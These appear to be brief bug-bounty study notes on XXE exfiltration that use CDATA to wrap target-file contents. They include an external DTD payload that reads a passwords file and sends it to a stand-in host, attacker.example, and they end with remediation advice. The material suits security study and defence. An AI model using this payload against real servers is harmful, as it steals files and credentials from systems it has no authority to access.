# XXE CDATA Exfiltration

- XML special characters inside a target file can break DTD/URL syntax during exfiltration.
- CDATA can wrap content so XML-significant characters are treated as data.
- External-DTD pattern from the chapter:
```xml
<!ENTITY % file SYSTEM "file:///passwords.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate 'http://attacker.example/?%start;%file;%end;'>">
%ent;
%exfiltrate;
```
- Use this when plain file substitution fails because of `<`, `>`, quotes, or `&` characters.
- Tool mentioned: XmlLint/xmllint-style validation can help catch malformed XML payload syntax.
- False-positive trap: parser restrictions on parameter entities/external DTDs still apply.
- Remediation: disable DTD/external entity processing rather than relying on character filtering.
## Source: Bug Bounty Bootcamp, Ch. 15
